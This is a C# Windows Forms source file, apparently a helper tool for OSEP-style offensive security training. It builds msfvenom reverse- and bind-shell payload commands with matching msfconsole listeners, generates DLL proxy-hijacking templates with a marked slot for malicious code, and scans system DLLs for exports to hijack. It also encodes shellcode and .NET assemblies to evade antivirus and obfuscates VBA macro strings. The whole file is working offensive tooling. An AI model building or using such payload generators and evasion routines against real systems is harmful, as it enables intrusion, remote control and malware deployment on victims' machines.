using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.IsolatedStorage;
using System.Linq;
using System.Reflection.PortableExecutable;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OSEP_2026
{


    public partial class Form1 : Form
    {
        private MSFVenom msv = new MSFVenom();
        
        public Form1()
        {
            InitializeComponent();
            UpdateMSFVenomUI();
            UpdatePayloadText();
            
        }

        private void btnMsvGenerate_Click(object sender, EventArgs e)
        {
            UpdatePayloadText();
            List<string> exports = PEHelper.GetExportedFunctions(@"C:\Windows\System32\Kernel32.dll");
        }

        private void UpdatePayloadText()
        {
            //Generate Command
            StringBuilder sbGenerator = new StringBuilder();
            sbGenerator.Append($"msfvenom -p {cbMsvPayload.Text} ");
            sbGenerator.Append($"-f {cbMsvOutput.Text} ");

            if (txtMsvFilename.Text.Length >= 1)
            {
                sbGenerator.Append($"-o {txtMsvFilename.Text} ");
            }

            if (cbMsvEncoding.Text != "None")
            {
                sbGenerator.Append($"-e {cbMsvEncoding.Text} ");

                if (numMsvEncIteration.Value >= 1)
                {
                    sbGenerator.Append($"-i {numMsvEncIteration.Value.ToString()} ");
                }
            }

            if (cbMsvEncryption.Text != "None")
            {
                sbGenerator.Append($"--encrypt {cbMsvEncryption.Text} ");

                if (cbMsvEncryption.Text == "aes256")
                {
                    sbGenerator.Append($"--encrypt-key {Utils.GenerateRandomString(32)} ");
                }

                if (cbMsvEncryption.Text == "aes256")
                {
                    sbGenerator.Append($"--encrypt-iv {Utils.GenerateRandomString(16)} ");
                }

                if (cbMsvEncryption.Text == "rc4")
                {
                    sbGenerator.Append($"--encrypt-key {Utils.GenerateRandomString(8)} ");
                }
            }

            if (numMsvNopSled.Value >= 1)
            {
                sbGenerator.Append($"-n {numMsvNopSled.Value.ToString()} ");
            }





            if (cbMsvPayload.Text.Contains("bind"))
            {
                sbGenerator.Append($"LPORT={txtLPORT.Text} ");
            }

            if (cbMsvPayload.Text.Contains("reverse"))
            {
                sbGenerator.Append($"LHOST={txtLHOST.Text} LPORT={txtLPORT.Text} ");
            }

            if (cbMsvPayload.Text.Contains("exec"))
            {
                sbGenerator.Append($"CMD=\"{txtMsvCmd.Text}\"");
            }

            sbGenerator.Append("EXITFUNC=thread");


            //Generate Listener
            StringBuilder sbListener = new StringBuilder();

            if (!cbMsvPayload.Text.Contains("exec"))
            {
                sbListener.Append($"");
                sbListener.Append($"msfconsole -q -x \"use multi/handler; set payload {cbMsvPayload.Text}; ");

                if (cbMsvPayload.Text.Contains("bind"))
                {
                    sbListener.Append($"set rhost {txtRHOST.Text}; set lport {txtLPORT.Text}; ");
                }

                if (cbMsvPayload.Text.Contains("reverse"))
                {
                    sbListener.Append($"set lhost {txtLHOST.Text}; set lport {txtLPORT.Text}; ");
                }

                sbListener.Append("run;\"");


            }




            txtMsvGenerator.Text = sbGenerator.ToString();
            txtMsvListener.Text = sbListener.ToString();
        }

        private void UpdateMSFVenomUI()
        {
            string oldchoice = cbMsvPayload.Text;

            cbMsvPayload.Text = "";
            cbMsvPayload.Items.Clear();
            foreach (MSFVenomPayload msvp in msv.payloads)
            {
                if (rbMsv64.Checked && msvp.Architecture == MSFVenomArch.x64)
                {
                    if (rbMsvStaged.Checked && msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                    else if (rbMsvFull.Checked && !msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                }
                        

                if (rbMsv86.Checked && msvp.Architecture == MSFVenomArch.x86)
                {
                    if (rbMsvStaged.Checked && msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                    else if (rbMsvFull.Checked && !msvp.staged)
                    {
                        cbMsvPayload.Items.Add(msvp.Name);
                    }
                }

            }
            cbMsvPayload.Text = cbMsvPayload.Items[0].ToString();

            foreach (string s in cbMsvPayload.Items)
            {
                string[] oldparts = oldchoice.Split('/');
                string[] newparts = s.Split('/');

                if (oldparts[oldparts.Length-1] == newparts[newparts.Length - 1])
                    cbMsvPayload.SelectedItem = s;
            }

            UpdatePayloadText();
        }

        private void rbMsv64_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void rbMsv86_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void rbMsvStaged_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void rbMsvFull_CheckedChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void numMsvEncIteration_ValueChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void cbMsvEncoding_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void cbMsvOutput_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtMsvFilename_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void cbMsvEncryption_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void numMsvNopSled_ValueChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtLHOST_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtRHOST_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtLPORT_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtRPORT_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void txtUSER_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void txtPASS_TextChanged(object sender, EventArgs e)
        {

        }

        private void txtMsvCmd_TextChanged(object sender, EventArgs e)
        {
            UpdateMSFVenomUI();
        }

        private void btnProxyLoad_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.InitialDirectory = @"C:\Windows\System32";
            ofd.Filter = "DLL Files (*.dll)|*.dll";
            ofd.DefaultExt = ".dll";
            ofd.ShowDialog();
            txtProxyPath.Text = ofd.FileName;
            List<string> exports = PEHelper.GetExportedFunctions(ofd.FileName);
            txtProxyOut.Clear();
            txtProxyOut.Text = ParseProxyDLL(exports, ofd.SafeFileName);

        }

        private string ParseProxyDLL(List<string> exports, string fname)
        {
            

            StringBuilder sb = new StringBuilder();

            sb.AppendLine($"// dllmain.cpp : Defines the entry point for the DLL application.");
            sb.AppendLine($"#include \"pch.h\"");
            sb.AppendLine($"#include <Windows.h>");
            sb.AppendLine($"");

            sb.AppendLine($"//Begin proxy stements for {fname}");
            sb.AppendLine($"#ifdef _WIN64");
            sb.AppendLine($"#define DLLPATH \"\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{fname}\"");
            sb.AppendLine($"#else");
            sb.AppendLine($"#define DLLPATH \"\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{fname}\"");
            sb.AppendLine($"#endif // _WIN64");
            sb.AppendLine($"");
            sb.AppendLine($"");

            foreach (var export in exports)
            {
                sb.AppendLine($"#pragma comment(linker, \"/EXPORT:{export}=\" DLLPATH \".{export}\")");
            }

            sb.AppendLine($"\n");

            sb.AppendLine($"BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {{");
            sb.AppendLine($"    switch (ul_reason_for_call) {{");
            sb.AppendLine($"            case DLL_PROCESS_ATTACH: {{");
            sb.AppendLine($"                //MALICIOUS CODE HERE");
            sb.AppendLine($"            }}");
            sb.AppendLine($"            case DLL_THREAD_ATTACH:");
            sb.AppendLine($"                break;");
            sb.AppendLine($"            case DLL_THREAD_DETACH:");
            sb.AppendLine($"                break;");
            sb.AppendLine($"            case DLL_PROCESS_DETACH:");
            sb.AppendLine($"                break;");
            sb.AppendLine($"    }}");
            sb.AppendLine($"    return TRUE;");
            sb.AppendLine($"}}");




            return sb.ToString();

        }


        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void btn_Export_Scanner_chdir_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog f = new FolderBrowserDialog();

            f.SelectedPath = txt_Export_Scanner_Dir.Text;
            f.ShowDialog();

            txt_Export_Scanner_Dir.Text = f.SelectedPath;
        }

        private void btn_Export_Scanner_Search_Click(object sender, EventArgs e)
        {
            string[] fileList = Directory.GetFiles(txt_Export_Scanner_Dir.Text);
            StringBuilder sb = new StringBuilder();

            sbProgress.Value = 0;
            sbProgress.Maximum = fileList.Length;
            sbLabel1.Text = "";

            foreach ( string file in fileList )
            {
                sbProgress.Increment(1);
                sbLabel1.Text = $"Scanning Exports: {file}";
                if (!file.EndsWith(".dll"))
                    continue;

                List<string> exports = PEHelper.GetExportedFunctions(file);

                foreach (string export in exports)
                {
                    if (export.ToLower().Contains(txt_Export_Scanner_Search_Term.Text.ToLower()))
                    {
                        if (export.Contains("@"))
                            continue;

                        sb.AppendLine($"{export.PadRight(50)}" + " --> " + file);
                    }

                    Application.DoEvents();
                }

            }


            sbLabel1.Text = "Scan complete...";
            txt_Export_Scanner_Out.Clear();
            txt_Export_Scanner_Out.Text = sb.ToString();


        }


        private string BeautifyBytes(byte[] bytes, int length)
        {
            StringBuilder sb = new StringBuilder();

            int i = 1;
            foreach ( byte b in bytes )
            {
                sb.Append($"0x{ b.ToString("x2")},");
                if ( i >= length )
                {
                    sb.Append("\n");
                    i = 0;
                }
                i++;
            }

            return sb.ToString().TrimEnd(',');
        }

        private string DrawCSharpByteCode(byte[] bytes)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append($"new byte[{bytes.Length}] {{\n");

            sb.Append(BeautifyBytes(bytes, 20));

            sb.Append("};\n");

            return sb.ToString();
        }


        private void Form1_Shown(object sender, EventArgs e)
        {
            txtCSE_out.Text = DrawCSharpByteCode(CONFIG.SHELLCODE64);
        }

        private void btnCSE_Encode_Click(object sender, EventArgs e)
        {
            string t = txtCSE_out.Text;

            //Normalize text
            string[] parts = t.Split('=');
            if (parts.Length == 2)
                t = parts[1];
            else
                t = parts[0];

            parts = t.Split('{');
            if (parts.Length == 2)
                t = parts[1];
            else
                t = parts[0];

            parts = t.Split('}');
            if (parts.Length == 2)
                t = parts[0];

            t = t.Replace("0x", "").Replace(@"\x",",").Replace("\"","").Replace("\n","").Replace(";","").TrimStart(',').TrimEnd(',');


            parts = t.Split(',');

            byte[] bytes = new byte[parts.Length];
            int i = 0;
            foreach (string s in parts)
            {
                bytes[i] = byte.Parse(s, System.Globalization.NumberStyles.HexNumber);
                i++;
            }

            bytes = Evasion.Encode(bytes);

            txtCSE_out.Text = DrawCSharpByteCode(bytes);

            txtCSE_out.AppendText("\n\nThe payload has been encoded using a custom routine.\nYou need to replace the SHELLCODE global with these bytes. \nAlso set ENCODED to true.\nand rebuild the solution.");


            Application.DoEvents();

        }

        private void btnVSO_Obfuscate_Click(object sender, EventArgs e)
        {
            string tx = txtVSO_In.Text;

            tx = tx.Replace("i", "\" & k & \"");
            tx = tx.Replace("e", "\" & b & \"");
            tx = tx.Replace("u", "\" & c & \"");
            tx = tx.Replace("o", "\" & d & \"");
            tx = tx.Replace("a", "\" & j & \"");
            tx = tx.Replace("m", "\" & f & \"");
            tx = tx.Replace("t", "\" & g & \"");
            tx = tx.Replace("x", "\" & h & \"");
            tx = tx.Replace("s", "\" & l & \"");

            txtVSO_out.Text = tx;
        }

        private void btnEA_Encode_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.InitialDirectory = Environment.CurrentDirectory;
            ofd.ShowDialog();

            byte[] assem = File.ReadAllBytes(ofd.FileName);

            byte[] encoded = Evasion.Encode(assem);

            FileInfo fi = new FileInfo(ofd.FileName);

            string[] nameparts = fi.Name.Split('.');

            string encodedName = fi.DirectoryName + "\\" + nameparts[0] + "-encoded" + fi.Extension;


            File.WriteAllBytes(encodedName, encoded);
            txtEA_out.Text = $"Encoded Assembly: {encodedName}";
        }

        private void cbMsvPayload_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdatePayloadText();
        }

        private void btnCSE_Decode_Click(object sender, EventArgs e)
        {
            string t = txtCSE_out.Text;

            //Normalize text
            string[] parts = t.Split('=');
            if (parts.Length == 2)
                t = parts[1];
            else
                t = parts[0];

            parts = t.Split('{');
            if (parts.Length == 2)
                t = parts[1];
            else
                t = parts[0];

            parts = t.Split('}');
            if (parts.Length == 2)
                t = parts[0];

            t = t.Replace("0x", "").Replace(@"\x", ",").Replace("\"", "").Replace("\n", "").Replace(";", "").TrimStart(',').TrimEnd(',');


            parts = t.Split(',');

            byte[] bytes = new byte[parts.Length];
            int i = 0;
            foreach (string s in parts)
            {
                bytes[i] = byte.Parse(s, System.Globalization.NumberStyles.HexNumber);
                i++;
            }

            bytes = Evasion.Decode(bytes);

            txtCSE_out.Text = DrawCSharpByteCode(bytes);

            //txtCSE_out.AppendText("\n\nThe payload has been encoded using a custom routine.\nYou need to replace the SHELLCODE global with these bytes. \nAlso set ENCODED to true.\nand rebuild the solution.");


            Application.DoEvents();
        }
    }
}
